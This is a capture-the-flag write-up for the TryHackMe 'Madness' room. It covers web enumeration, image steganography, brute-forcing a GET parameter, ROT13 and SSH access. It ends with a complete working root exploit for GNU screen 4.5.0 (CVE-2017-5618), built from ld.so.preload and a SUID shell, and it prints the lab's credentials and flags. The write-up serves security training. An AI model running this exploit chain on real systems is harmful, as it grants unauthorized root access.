| Category          | Details                                                              |
|-------------------|----------------------------------------------------------------------|
| 📝 **Name**       | [Madness](https://tryhackme.com/room/madness)                        |  
| 🏷 **Type**       | THM Challenge                                                        |
| 🖥 **OS**         | Linux                                                                |
| 🎯 **Difficulty** | Easy                                                                 |
| 📁 **Tags**       | Web enumeration, Steganography, screen, CVE-2017-5618, ld.so.preload |

## Task 1: Flag Submission

### user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-30 08:38 +0100
Nmap scan report for 10.81.143.0
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.55 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,txt,jpg,png 
<SNIP>
200      GET      237l      524w    39525c http://10.80.138.18/thm.jpg
<SNIP>  
```

#### Download `thm.jpg`
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ wget http://$TARGET/thm.jpg    
--2025-12-30 22:29:28--  http://10.80.138.18/thm.jpg
Connecting to 10.80.138.18:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22210 (22K) [image/jpeg]
Saving to: ‘thm.jpg’

thm.jpg                                          100%[==========================================================================================================>]  21.69K  --.-KB/s    in 0.04s   

2025-12-30 22:29:28 (545 KB/s) - ‘thm.jpg’ saved [22210/22210]
```
After opening file seems to be corrupted.

#### Check `thm.jpg` header
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ hexdump -n 32 -C thm.jpg
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 01 01 00 00 01  |.PNG............|
00000010  00 01 00 00 ff db 00 43  00 03 02 02 03 02 02 03  |.......C........|
00000020
```
It seems that this is JPG image with PNG header.

#### Fix header
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ printf '\xff\xd8\xff\xe0\x00\x10JFIF' | dd of=thm.jpg bs=1 seek=0 count=10 conv=notrunc
10+0 records in
10+0 records out
10 bytes copied, 8.9076e-05 s, 112 kB/s
```

#### Discover hidden URL in fixed `thm.jpg`
![Hidden directory](images/thm.jpg)

#### Enter discovered `/th1s_1s_h1dd3n` URL
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ curl http://$TARGET/th1s_1s_h1dd3n/
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: </p>

<p>That is wrong! Get outta here!</p>

</div>
</body>
</html>
```
It seems that page requires a 'secret' and we got hint that it should be a value between 0 and 99.

#### Try passing `secret` in HTTP GET parameter
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ curl http://$TARGET/th1s_1s_h1dd3n/?secret=0 
<SNIP>
<p>Secret Entered: 0</p>

<p>That is wrong! Get outta here!</p>
<SNIP> 
```
`secert` parameter has been accepted, but the value was incorrect.

#### Bruteforce `secret` HTTP GET parameter
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ seq -w 0 99 > secret.txt && ffuf -r -u "http://$TARGET/th1s_1s_h1dd3n?secret=FUZZ" -w secret.txt -fs 408
<SNIP>
73                      [Status: 200, Size: 445, Words: 53, Lines: 19, Duration: 40ms]
<SNIP>                                                                             
```
`73` has been discovered as secret

#### Pass `secret=73` to `/th1s_1s_h1dd3n` URL
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ curl http://$TARGET/th1s_1s_h1dd3n/?secret=73
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>

</div>
</body>
</html>
```
It seems that we have discovered some password, but we do not have the username. As challenge seems to be set in a 'universe' of Alice in Wonderland, if tried to use all the characters from this novel, but with no effect. The challenge itself comes with a note `Please note this challenge does not require SSH brute forcing.` and image which is embedded in THM room page.

#### Try to extract data from the provided image with `steghide`
Image found on the THM challenge room page: 
![Madness](images/5iW7kC8.jpg)
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ steghide --extract -sf 5iW7kC8.jpg -p ''
wrote extracted data to "password.txt".

┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ cat password.txt                                               
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```
Is seems that we have found another password. Since this challenge already involves steganography we could try to analyze fixed `thm.jpg` image as well.

#### Try to extract data from fixed `thm.jpg` image with `steghide`
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ steghide --extract -sf thm.jpg -p ''                                                   
steghide: could not extract any data with that passphrase!
```

Re-try with passwords discovered so far.
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ steghide --extract -sf thm.jpg -p '*axA&GF8dP'                                         
steghide: could not extract any data with that passphrase!

┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ steghide --extract -sf thm.jpg -p 'y2RPJ4QaPF!B'                                       
wrote extracted data to "hidden.txt".

┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ cat hidden.txt  
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```
We have found the username, however we were not able to access target over SSH using this username and both discovered passwords. There is a hint in the challenge which states:
> There's something ROTten about this guys name!

This suggests to ROT this username.

#### Check all possible rotations for `wbxre`
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ ~/Tools/crypto/rot.py wbxre                                                                                          
<SNIP>
ROT10: glhbo
ROT11: hmicp
ROT12: injdq
ROT13: joker
ROT14: kplfs
ROT15: lqmgt
ROT16: mrnhu
<SNIP>
```
ROT13 yields `joker` which seems only reasonable result.

#### Gain foothold using `joker:*axA&GF8dP` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Madness]
└─$ ssh joker@$TARGET
<SNIP>
joker@ubuntu:~$ id
uid=1000(joker) gid=1000(joker) groups=1000(joker)
```

#### Capture user flag
```
joker@ubuntu:~$ cat /home/joker/user.txt 
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

### root.txt

#### Discover `screen` vulnerable to [CVE-2017-5618](https://nvd.nist.gov/vuln/detail/CVE-2017-5618)
Binary found with `linpeas.sh`
```
joker@ubuntu:~$ ls -la /bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0
joker@ubuntu:~$ /bin/screen-4.5.0 --version
Screen version 4.05.00 (GNU) 10-Dec-16
```

#### Prepare root shell
```
joker@ubuntu:~$ { cat <<'EOF'> /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
} && gcc -w -o /tmp/rootshell /tmp/rootshell.c
```

#### Prepare library for setting SUID for `/tmp/rootshell`
```
joker@ubuntu:~$ { cat <<'EOF'> /tmp/lib.rootshell.c
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
} && gcc -w -fPIC -shared -ldl -o /tmp/lib.rootshell.so /tmp/lib.rootshell.c
```

#### Exploit [CVE-2017-5618](https://nvd.nist.gov/vuln/detail/CVE-2017-5618) to spawn root shell
```
joker@ubuntu:~$ cd /etc && \
umask 000 && \
/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/lib.rootshell.so" && \
screen -ls; \
/tmp/rootshell -p
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
No Sockets found in /tmp/screens/S-joker.

# id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
```

#### Capture root flag
```
# cat /root/root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```
